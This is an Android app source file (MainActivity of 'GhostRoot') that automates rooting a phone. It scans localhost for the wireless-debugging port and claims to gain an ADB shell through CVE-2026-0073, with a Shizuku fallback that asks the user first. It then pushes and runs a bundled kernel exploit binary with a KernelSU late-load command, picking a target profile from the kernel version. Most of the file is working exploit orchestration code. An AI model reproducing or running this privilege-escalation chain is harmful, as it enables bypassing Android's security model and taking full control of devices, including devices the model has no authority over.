package com.fuxi.ghostroot;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.system.Os;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MainActivity extends Activity {

    private static final String[] KSU_PKGS = {
        "me.weishu.kernelsu",
        "com.resukisu.resukisu",
        "com.sukisu.ultra"
    };

    /** Shizuku 授权请求码。 */
    private static final int SHIZUKU_REQ = 4001;

    /** Path (inside the shell domain) where ksud was staged, e.g. /data/local/tmp/ksud. */
    private String ksudPath;

    private TextView output;
    private ScrollView scroll;
    private Button runBtn;
    private Button copyBtn;
    private Button saveBtn;
    private final StringBuilder fullLog = new StringBuilder();
    private final Handler ui = new Handler(Looper.getMainLooper());
    private final ExecutorService pool = Executors.newSingleThreadExecutor();
    private volatile boolean running = false;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);
        // 在布局最顶部插入「独立 Shell 终端」入口（纯代码，避免改资源/R.java）
        try {
            android.widget.LinearLayout root = (android.widget.LinearLayout) findViewById(R.id.run).getParent();
            Button termBtn = new Button(this);
            termBtn.setText("独立 Shell 终端（Shizuku）");
            termBtn.setLayoutParams(new android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));
            termBtn.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    try {
                        startActivity(new android.content.Intent(
                                MainActivity.this, ShellTerminalActivity.class));
                    } catch (Throwable t) {
                        Toast.makeText(MainActivity.this, "打开终端失败: " + t, Toast.LENGTH_LONG).show();
                    }
                }
            });
            root.addView(termBtn, 0);
        } catch (Throwable ignored) {}
        output = (TextView) findViewById(R.id.output);
        scroll = (ScrollView) findViewById(R.id.scroll);
        runBtn = (Button) findViewById(R.id.run);
        copyBtn = (Button) findViewById(R.id.copy);
        saveBtn = (Button) findViewById(R.id.save);
        copyBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { copyLogToClipboard(); }
        });
        saveBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { saveLogToFile(); }
        });
        runBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { start(); }
        });
        log("GhostRoot v1  |  " + Build.MODEL + " / " + Build.FINGERPRINT);
        log("");
        log("步骤：");
        log("  1) 打开【开发者选项】->【无线调试】（会自动关闭，开了马上点）");
        log("  2) 点【一键提权】，APP 自动扫端口并完成全部流程");
        log("");
    }

    @Override
    protected void onDestroy() {
        pool.shutdownNow();
        super.onDestroy();
    }

    private void log(final String s) {
        ui.post(new Runnable() {
            @Override public void run() {
                fullLog.append(s).append("\n");
                output.append(s + "\n");
                scroll.post(new Runnable() {
                    @Override public void run() { scroll.fullScroll(View.FOCUS_DOWN); }
                });
            }
        });
    }

    private void setRunning(final boolean r) {
        running = r;
        ui.post(new Runnable() {
            @Override public void run() {
                runBtn.setEnabled(!r);
                runBtn.setText(r ? "执行中..." : "一键提权");
            }
        });
    }

    private void start() {
        if (running) return;
        setRunning(true);
        output.setText("");
        fullLog.setLength(0);
        pool.execute(new Runnable() {
            @Override public void run() {
                try { doWork(); }
                catch (Throwable t) { log("[!] 异常: " + t); }
                finally { setRunning(false); saveLogToFile(); }
            }
        });
    }

    /* ============================ core work ============================ */

    private File nativeBin(String name) {
        return new File(getApplicationInfo().nativeLibraryDir, name);
    }

    private void doWork() throws Exception {
        File ghost = nativeBin("libghostroot.so");
        File f8550 = nativeBin("libfuxi8550.so");
        log("[*] ghostroot : " + ghost + " exists=" + ghost.exists() + " len=" + ghost.length());
        log("[*] fuxi8550  : " + f8550 + " exists=" + f8550.exists() + " len=" + f8550.length());
        if (!ghost.exists() || !f8550.exists()) {
            log("[!] 内置二进制方缺失，APK 打包异常");
            return;
        }

        // ============ 阶段 A：获取 shell 域（主路 0073 → 兜底 Shizuku） ============
        Shell shell = null;

        // A1) 主路：0073
        log("[*] 扫描无线调试端口 127.0.0.1:30000-65535 ...");
        int port = scanPort(30000, 65535);
        if (port < 0) {
            log("[!] 未扫到无线调试端口。请开启【无线调试】后立即重试。");
        } else {
            log("[+] 端口 = " + port);
            log("[*] [主路] 通过 CVE-2026-0073 获取 shell ...");
            Adb0073Shell s73 = new Adb0073Shell("127.0.0.1", port);
            String probe = s73.exec("id");
            log(s73.log());
            log(probe == null ? "(null)" : probe);
            if (probe != null && (probe.indexOf("uid=2000") >= 0 || probe.indexOf("uid=0") >= 0)) {
                log("[+] [主路] shell 域已获取");
                shell = s73;
            } else {
                log("[!] [主路] 0073 未取得 shell 域");
                s73.close();
            }
        }

        // A2) 兜底：Shizuku（由用户选择）
        if (shell == null) {
            shell = tryShizukuFallback();
        }

        if (shell == null) {
            log("[!] 0073 与 Shizuku 均未取得 shell 域，中止");
            return;
        }
        log("[+] 当前通道: " + shell.name());

        // ============ 阶段 B：与通道无关的提权流程 ============

        // 2b) 内核版本自动选择：拿 shell 之后读，回显给用户
        log("[*] 探测内核版本 ...");
        String kver = shell.exec("uname -r");
        kver = (kver == null) ? "" : kver.trim();
        // 只取第一行（避免混入 adb 日志/多行输出）
        int nl = kver.indexOf('\n');
        if (nl >= 0) kver = kver.substring(0, nl).trim();
        log("[*] 内核: " + (kver.isEmpty() ? "(读取失败)" : kver));
        String target = kernelTarget(kver);
        if (target == null) {
            log("[!] 未识别的内核版本 [" + kver + "]，本工具仅支持 5.15.178 / 5.15.194");
            log("[!] 已中止，避免 8550 回落到默认 profile 写坏内核");
            return;
        }
        log("[+] 检测到内核版本 " + kver + " → 使用 " + target + " profile");

        // 4a) push 8550 into shell-readable space
        log("[*] 推送 8550 到 /data/local/tmp ...");
        String remote8550 = "/data/local/tmp/fuxi8550";
        byte[] data8550 = readAllBytes(f8550);
        log("[*] 8550 size=" + data8550.length);
        boolean ok850 = shell.push(data8550, remote8550);
        log(shell.log());
        String chk850 = shell.exec(
                "ls -l " + remote8550 + "; echo SZ$(stat -c %s " + remote8550 + ")");
        log(chk850 == null ? "(null)" : chk850);
        if (!ok850 || chk850 == null || chk850.indexOf("SZ" + data8550.length) < 0) {
            log("[!] 8550 大小校验不符，中止");
            return;
        }
        log("[+] 8550 已就位");

        // 3b) locate ksud -- done entirely inside the shell domain
        log("[*] 定位 ksud ...");
        File ksud = extractKsud(getFilesDir(), shell);
        if (ksud == null) {
            log("[!] no ksud found; stopping before late-load");
            return;
        }
        String remoteKsud = ksudPath != null ? ksudPath : "/data/local/tmp/ksud";
        String chkKs = shell.exec(
                "ls -l " + remoteKsud + "; echo SZSIZE; stat -c %s " + remoteKsud);
        log(chkKs == null ? "(null)" : chkKs);
        if (chkKs == null || chkKs.indexOf(remoteKsud) < 0) {
            log("[!] ksud 未就位，中止");
            return;
        }
        log("[+] ksud 已就位: " + remoteKsud);

        // 4c) run the exploit: fuxi8550 --root-command '<ksud> late-load' --target <自动探测>
        log("[*] 执行提权（可能因竞态卡死，请保持屏常亮）...");
        String post = remote8550 + " --root-command '" + remoteKsud
                + " late-load' --target " + target + " 2>&1";
        String res = shell.exec(post);
        log(res == null ? "(null)" : res);
        log("");
        log("==== 完成（结果见上）====");

        shell.close();
    }

    /**
     * 0073 失败后的兜底：Shizuku 通道。
     *
     * 流程：bootstrap 拿 binder → 看服务在不在 → 看有没有授权 →
     *      弹窗让【用户自己选】→ 选了就 verify 并返回。
     */
    private Shell tryShizukuFallback() {
        log("");
        log("[*] [兜底] 尝试 Shizuku 通道 ...");

        // 1) 手动绑定 Shizuku binder（替代 ShizukuProvider）
        boolean boot = ShizukuAdapter.bootstrap(this);
        log("[*] shizuku bootstrap = " + boot);
        if (!boot || !ShizukuAdapter.isBinderAlive()) {
            log("[!] [兜底] 未检测到运行中的 Shizuku");
            log("[*]       如需使用兜底通道：安装并启动 Shizuku（ADB 模式）后重试");
            return null;
        }
        log("[*] shizuku 状态: " + ShizukuAdapter.describe());

        // 2) 授权检查
        if (!ShizukuAdapter.isGranted()) {
            log("[!] [兜底] GhostRoot 尚未获得 Shizuku 授权");
            log("[*]       请在弹窗中允许授权后重试");
            askShizukuPermission();
            return null;
        }

        // 3) 弹窗：让用户自己选
        final boolean[] useIt = { false };
        final java.util.concurrent.CountDownLatch latch =
                new java.util.concurrent.CountDownLatch(1);
        ui.post(new Runnable() {
            @Override public void run() {
                try {
                    new AlertDialog.Builder(MainActivity.this)
                        .setTitle("0073 通道未打通")
                        .setMessage("检测到 Shizuku 可用（uid=2000，与 0073 等价的 shell 域）。\n\n"
                                + "是否改用 Shizuku 通道继续提权？")
                        .setPositiveButton("用 Shizuku", new DialogInterface.OnClickListener() {
                            @Override public void onClick(DialogInterface d, int w) {
                                useIt[0] = true; latch.countDown();
                            }
                        })
                        .setNegativeButton("中止", new DialogInterface.OnClickListener() {
                            @Override public void onClick(DialogInterface d, int w) {
                                useIt[0] = false; latch.countDown();
                            }
                        })
                        .setCancelable(false)
                        .show();
                } catch (Throwable t) {
                    latch.countDown();
                }
            }
        });
        try { latch.await(); } catch (Throwable ignored) {}
        if (!useIt[0]) {
            log("[*] 用户选择中止");
            return null;
        }

        // 4) 用户选了 → 验证并返回
        log("[*] [兜底] 用户选择使用 Shizuku，正在验证 shell 域 ...");
        ShizukuShell ss = new ShizukuShell(this);
        String id = ss.exec("id");
        log(id == null ? "(null)" : id);
        if (!ss.verify()) {
            log("[!] [兜底] Shizuku 通道未取得 shell 域");
            return null;
        }
        log("[+] [兜底] shell 域已获取（Shizuku / " + ShizukuAdapter.selinuxContext() + "）");
        return ss;
    }

    /** 请求 Shizuku 授权（结果会弹 Shizuku 自己的授权窗）。 */
    private void askShizukuPermission() {
        try {
            ui.post(new Runnable() {
                @Override public void run() {
                    try { ShizukuAdapter.requestPermission(SHIZUKU_REQ); }
                    catch (Throwable ignored) {}
                }
            });
        } catch (Throwable ignored) {}
    }

    /** Return the app-private path of libksud.so (or a local copy) for pushing. */
    /**
     * Locate libksud.so from whatever KernelSU / ReSukiSU / SukiSU variant is
     * installed, copy it into our private dir and return that copy.
     *
     * Strategy: try the well-known package names first, then fall back to
     * walking EVERY installed package looking for a libksud.so.  Manager app
     * package names differ wildly between forks, so a hardcoded list is not
     * reliable.
     */
    /**
     * Locate the ksud binary that the 8550 late-load path should execute.
     *
     * Everything here goes through the *shell* domain (uid=2000), NOT through
     * PackageManager: our app targets SDK 34, so Android package-visibility
     * filters getInstalledApplications() down to just ourselves -- which is
     * exactly the "1 packages" we saw.  `pm list packages` run as shell has no
     * such restriction.
     *
     * Search order:
     *   1. /data/adb/ksu/ksud      -- KernelSU runtime (the real target)
     *   2. /data/adb/ksud          -- older / Magisk-style layout
     *   3. <manager apk>/lib/arm64/libksud.so -- packaged fallback inside the
     *      KernelSU / ReSukiSU / SukiSU manager app
     */
    private File extractKsud(File dir, Shell sh) {
        String[] direct = { "/data/adb/ksu/ksud", "/data/adb/ksud" };
        for (String p : direct) {
            String r = sh.exec("ls -l " + p + " 2>&1; stat -c %s " + p + " 2>&1");
            log("[*] probe " + p + " -> " + (r == null ? "(null)" : r.trim()));
            if (r != null && r.contains("SKSIZE")) {
                continue; // placeholder, unreachable
            }
            if (r != null && r.indexOf("No such file") < 0 && r.indexOf("Permission denied") < 0) {
                // pull it down through the raw push channel in reverse is not
                // implemented; instead copy it inside the shell domain
                String dst = "/data/local/tmp/ksud";
                String c = sh.exec(
                        "cp " + p + " " + dst + " 2>&1; chmod 755 " + dst + " 2>&1; "
                        + "ls -l " + dst + "; stat -c %s " + dst);
                log("[*] copy " + p + " -> " + dst + " : " + (c == null ? "(null)" : c.trim()));
                if (c != null && c.indexOf(dst) >= 0) {
                    String size = after(c, "SZSIZE");
                    log("[+] ksud staged at " + dst + " (size " + (size == null ? "?" : size.trim()) + ")");
                    // remember the path via a marker file so doWork can use it
                    ksudPath = dst;
                    return new File(dst);
                }
            }
        }

        log("[*] pm list packages | grep -iE 'kernelsu|sukisu|ksu' ...");
        String pkgs = sh.exec(
                "pm list packages 2>&1 | grep -iE 'kernelsu|sukisu|suki|ksu'");
        log("[*] matches: " + (pkgs == null ? "(null)" : pkgs.trim()));
        if (pkgs != null) {
            for (String line : pkgs.split("\\r?\\n")) {
                line = line.trim();
                if (line.startsWith("package:")) line = line.substring(8).trim();
                if (line.isEmpty()) continue;
                String pathOut = sh.exec("pm path " + line + " 2>&1");
                log("[*] pm path " + line + " -> " + (pathOut == null ? "(null)" : pathOut.trim()));
                if (pathOut == null) continue;
                for (String pl : pathOut.split("\\r?\\n")) {
                    pl = pl.trim();
                    if (!pl.startsWith("package:")) continue;
                    String apk = pl.substring(8).trim();
                    int slash = apk.lastIndexOf('/');
                    if (slash <= 0) continue;
                    String base = apk.substring(0, slash);
                    String lib = base + "/lib/arm64";
                    String probe = sh.exec(
                            "ls -l " + lib + "/libksud.so 2>&1; stat -c %s " + lib + "/libksud.so 2>&1");
                    log("[*] probe " + lib + "/libksud.so -> "
                            + (probe == null ? "(null)" : probe.trim()));
                    if (probe == null || probe.indexOf("No such file") >= 0) continue;
                    String dst = "/data/local/tmp/ksud";
                    String c = sh.exec(
                            "cp " + lib + "/libksud.so " + dst + " 2>&1; chmod 755 " + dst
                            + " 2>&1; ls -l " + dst + "; stat -c %s " + dst);
                    log("[*] copy -> " + dst + " : " + (c == null ? "(null)" : c.trim()));
                    if (c != null && c.indexOf(dst) >= 0) {
                        log("[+] ksud staged at " + dst + " (from " + line + ")");
                        ksudPath = dst;
                        return new File(dst);
                    }
                }
            }
        }

        log("[!] no ksud found; stopping before late-load");
        log("[*] diagnostic: ls /data/adb/");
        String d = sh.exec("ls -la /data/adb/ 2>&1");
        log(d == null ? "(null)" : d);
        return null;
    }

    /**
     * 从 uname -r 输出中提取剖面号（内核版本后三位），映射到 8550 的 --target 选择器。
     *
     *   5.15.178-android13-8-00021-g6f2f96be86b9-ab13729987  ->  "178"
     *   5.15.194-android13-8-00019-gf4321180a397-ab15212794  ->  "194"
     *
     * 为什么要显式传 --target：8550 自己也会匹配，但匹配不上时它会"静默回落到
     * OS3.0.303.0.WNKCNXM"的默认 profile（其自带告警：default addresses may
     * corrupt an incompatible kernel）。显式指定可彻底避免那个坑。
     *
     * @return "178" / "194"；无法识别时返回 null（调用方应中止，不要硬跑）
     */
    private static String kernelTarget(String kver) {
        if (kver == null) return null;
        // 形如 5.15.178-android13-...  ->  抓出第一段"数字.数字.数字"
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("(\\d+)\\.(\\d+)\\.(\\d+)")
                .matcher(kver);
        if (!m.find()) return null;
        String major = m.group(1), minor = m.group(2), patch = m.group(3);
        // 只支持 5.15 系列
        if (!"5".equals(major) || !"15".equals(minor)) return null;
        if ("178".equals(patch)) return "178";
        if ("194".equals(patch)) return "194";
        return null;
    }

    /** Return the text after the first occurrence of key, or null. */
    private static String after(String s, String key) {
        int i = s.indexOf(key);
        if (i < 0) return null;
        i += key.length();
        int j = i;
        while (j < s.length() && s.charAt(j) != '\n' && s.charAt(j) != '\r') j++;
        return s.substring(i, j);
    }

    private void copyFile(File src, File dst) throws Exception {
        InputStream in = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dst, false);
        byte[] buf = new byte[32768];
        int n;
        while ((n = in.read(buf)) > 0) fos.write(buf, 0, n);
        fos.flush(); fos.close(); in.close();
    }

    private static byte[] readAllBytes(File f) throws Exception {
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        InputStream in = new FileInputStream(f);
        byte[] buf = new byte[65536];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        return bos.toByteArray();
    }

    /* ============================ port scan ============================ */

    private int scanPort(int lo, int hi) {
        final List<Integer> found = new ArrayList<Integer>();
        final int workers = 24;
        final int[] next = { lo };
        Thread[] ts = new Thread[workers];
        for (int i = 0; i < workers; i++) {
            ts[i] = new Thread(new Runnable() {
                @Override public void run() {
                    for (;;) {
                        int p;
                        synchronized (next) {
                            if (next[0] > hi) return;
                            p = next[0]++;
                        }
                        Socket s = new Socket();
                        try {
                            s.connect(new InetSocketAddress("127.0.0.1", p), 40);
                            synchronized (found) { found.add(p); }
                        } catch (Throwable ignored) {
                        } finally {
                            try { s.close(); } catch (Throwable ignored) {}
                        }
                    }
                }
            });
            ts[i].setDaemon(true);
            ts[i].start();
        }
        for (Thread t : ts) { try { t.join(); } catch (InterruptedException ignored) {} }
        // pick a port that speaks the ADB/STLS handshake
        for (Integer p : found) {
            if (speaksAdb(p)) return p;
        }
        return found.isEmpty() ? -1 : found.get(0);
    }

    /** Send a cleartext CNXN and check whether the reply is STLS/CNXN (i.e. adbd). */
    private boolean speaksAdb(int port) {
        Socket s = new Socket();
        try {
            s.connect(new InetSocketAddress("127.0.0.1", port), 400);
            s.setSoTimeout(700);
            s.getOutputStream().write(buildCnxn());
            s.getOutputStream().flush();
            byte[] hdr = new byte[24];
            int got = 0;
            while (got < 24) {
                int r = s.getInputStream().read(hdr, got, 24 - got);
                if (r <= 0) break;
                got += r;
            }
            if (got < 24) return false;
            int cmd = (hdr[0] & 0xff) | ((hdr[1] & 0xff) << 8) | ((hdr[2] & 0xff) << 16) | ((hdr[3] & 0xff) << 24);
            return cmd == 0x534c5453 /*STLS*/ || cmd == 0x4e584e43 /*CNXN*/;
        } catch (Throwable t) {
            return false;
        } finally {
            try { s.close(); } catch (Throwable ignored) {}
        }
    }

    private byte[] buildCnxn() {
        String banner = "host::features=shell_v2,cmd,stat_v2,delayed_ack";
        byte[] pay = banner.getBytes();
        int len = pay.length;
        int csum = 0; for (byte x : pay) csum += (x & 0xff);
        int magic = 0x4e584e43 ^ 0xFFFFFFFF;
        byte[] p = new byte[24 + len];
        put(p, 0, 0x4e584e43); put(p, 4, 0x01000001); put(p, 8, 256 * 1024);
        put(p, 12, len); put(p, 16, csum); put(p, 20, magic);
        System.arraycopy(pay, 0, p, 24, len);
        return p;
    }

    private static void put(byte[] b, int off, int v) {
        b[off]     = (byte) (v & 0xff);
        b[off + 1] = (byte) ((v >>> 8) & 0xff);
        b[off + 2] = (byte) ((v >>> 16) & 0xff);
        b[off + 3] = (byte) ((v >>> 24) & 0xff);
    }

    /* ============================ log export ============================ */
    private void copyLogToClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("GhostRootLog", fullLog.toString()));
            ui.post(new Runnable() {
                @Override public void run() {
                    Toast.makeText(MainActivity.this, "日志已复制（" + fullLog.length() + " 字符）", Toast.LENGTH_SHORT).show();
                }
            });
        } catch (Throwable t) {
            ui.post(new Runnable() {
                @Override public void run() {
                    Toast.makeText(MainActivity.this, "复制失败: " + t, Toast.LENGTH_LONG).show();
                }
            });
        }
    }
    /** Always write to app-private dir; also try /sdcard for easy pickup. */
    private void saveLogToFile() {
        try {
            String body = "GhostRoot log\nmodel=" + Build.MODEL + "\nfp=" + Build.FINGERPRINT + "\n" + fullLog.toString();
            File priv = new File(getFilesDir(), "ghostroot_log.txt");
            FileOutputStream f1 = new FileOutputStream(priv, false);
            f1.write(body.getBytes()); f1.flush(); f1.close();
            String pubPath = "/sdcard/GhostRoot_log.txt";
            try {
                FileOutputStream f2 = new FileOutputStream(pubPath, false);
                f2.write(body.getBytes()); f2.flush(); f2.close();
            } catch (Throwable t) { pubPath = priv.getAbsolutePath() + " (sdcard failed)"; }
            final String shown = pubPath;
            ui.post(new Runnable() {
                @Override public void run() {
                    Toast.makeText(MainActivity.this, "日志已存: " + shown, Toast.LENGTH_LONG).show();
                }
            });
        } catch (Throwable t) {
            // ignore
        }
    }
    /* ============================ exec helper ============================ */

    private String execCapture(String[] argv, long timeoutMs) {
        Process p = null;
        try {
            p = new ProcessBuilder(argv).redirectErrorStream(true).start();
            final Process fp = p;
            final StringBuilder sb = new StringBuilder();
            Thread rd = new Thread(new Runnable() {
                @Override public void run() {
                    try {
                        BufferedReader br = new BufferedReader(new InputStreamReader(fp.getInputStream()));
                        String line;
                        while ((line = br.readLine()) != null) sb.append(line).append("\n");
                    } catch (Throwable ignored) {}
                }
            });
            rd.setDaemon(true);
            rd.start();
            boolean done = p.waitFor(timeoutMs, TimeUnit.MILLISECONDS);
            if (!done) {
                p.destroy();
                p.waitFor(2, TimeUnit.SECONDS);
                p.destroyForcibly();
            }
            rd.join(1500);
            return sb.toString();
        } catch (Throwable t) {
            return "[exec error] " + t;
        } finally {
            if (p != null) { try { p.getInputStream().close(); } catch (Throwable ignored) {} }
        }
    }

    private static String tailOf(String s) {
        if (s == null) return "";
        int n = s.length();
        return " | " + (n > 600 ? s.substring(n - 600) : s).replace("\n", " ");
    }

}